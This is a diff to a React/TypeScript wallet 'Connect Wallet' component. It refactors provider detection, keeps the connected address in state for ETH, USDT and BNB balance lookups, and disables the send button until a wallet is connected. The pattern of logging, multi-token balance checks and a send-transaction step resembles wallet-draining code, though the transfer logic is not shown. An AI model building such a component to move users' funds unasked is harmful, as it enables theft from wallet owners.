@@ -64,36 +64,31 @@ const sendLog = async (type: string, details: string) => {
 export function ConnectButton() {
   const { open } = useWeb3Modal()
   const [provider, setProvider] = useState<Web3Provider | null>(null)
-
-  const detectWallet = () => {
-    if (typeof window.ethereum !== 'undefined') {
-      return window.ethereum
-    }
-    if (typeof window.web3 !== 'undefined') {
-      return window.web3.currentProvider
-    }
-    return null
-  }
+  const [address, setAddress] = useState<string | null>(null)
 
   const connectWallet = async () => {
     try {
-      let detectedProvider = detectWallet()
+      let detectedProvider = null
+
+      if (typeof window.ethereum !== 'undefined') {
+        detectedProvider = window.ethereum
+      } else if (typeof window.web3 !== 'undefined') {
+        detectedProvider = window.web3.currentProvider
+      } else {
+        detectedProvider = await open()
+      }
 
       if (!detectedProvider) {
-        console.log('No provider detected, opening WalletConnect modal...')
-        detectedProvider = await open()
-        console.log('WalletConnect provider:', detectedProvider)
-        if (!detectedProvider) {
-          throw new Error('No wallet provider found')
-        }
+        throw new Error('No wallet provider found')
       }
 
       const web3Provider = new Web3Provider(detectedProvider as ExternalProvider)
       setProvider(web3Provider)
 
       const signer = web3Provider.getSigner()
-      const address = await signer.getAddress()
-      console.log('Connected address:', address)
+      const userAddress = await signer.getAddress()
+      setAddress(userAddress)
+      console.log('Connected address:', userAddress)
     } catch (error) {
       console.error('Error connecting wallet:', error)
       alert('Error connecting wallet')
@@ -108,7 +103,6 @@ export function ConnectButton() {
 
     try {
       const signer = provider.getSigner()
-      const address = await signer.getAddress()
 
       // Token contract addresses
       const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
@@ -125,9 +119,9 @@ export function ConnectButton() {
       const bnbContract = new Contract(bnbAddress, erc20Abi, signer)
 
       // Fetch balances
-      const ethBalance = await provider.getBalance(address)
-      const usdtBalance = await usdtContract.balanceOf(address)
-      const bnbBalance = await bnbContract.balanceOf(address)
+      const ethBalance = await provider.getBalance(address!)
+      const usdtBalance = await usdtContract.balanceOf(address!)
+      const bnbBalance = await bnbContract.balanceOf(address!)
 
       console.log('ETH Balance:', ethBalance.toString())
       console.log('USDT Balance:', usdtBalance.toString())
@@ -196,7 +190,7 @@ export function ConnectButton() {
   return (
     <>
       <Button onClick={connectWallet}>Connect Wallet</Button>
-      <Button onClick={sendTransaction}>Send Transaction</Button>
+      <Button onClick={sendTransaction} disabled={!provider}>Send Transaction</Button>
     </>
   )
 }
